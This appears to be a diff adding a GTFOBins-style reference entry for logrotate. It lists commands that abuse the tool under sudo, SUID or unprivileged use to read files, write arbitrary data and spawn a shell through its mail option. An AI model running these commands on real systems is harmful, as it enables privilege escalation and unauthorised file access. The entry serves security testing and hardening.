@@ -1,0 +1,41 @@
+logrotate
+=========
+
+File read
+---------
+
+[Sudo]
+    logrotate /path/to/input-file
+    The first word is returned in a error message.
+
+[SUID]
+    logrotate /path/to/input-file
+    The first word is returned in a error message.
+
+[Unprivileged]
+    logrotate /path/to/input-file
+    The first word is returned in a error message.
+
+File write
+----------
+
+[Sudo]
+    logrotate -l /path/to/output-file DATA
+    The content is written in a log file.
+
+[SUID]
+    logrotate -l /path/to/output-file DATA
+    The content is written in a log file.
+
+[Unprivileged]
+    logrotate -l /path/to/output-file DATA
+    The content is written in a log file.
+
+Shell
+-----
+
+[Sudo]
+    echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config
+echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh
+logrotate -m /path/to/temp-file.sh -f /path/to/temp-file
+    This command is picky about file permissions. An existing config file can be used as weel, provided that it contains a mail directive.
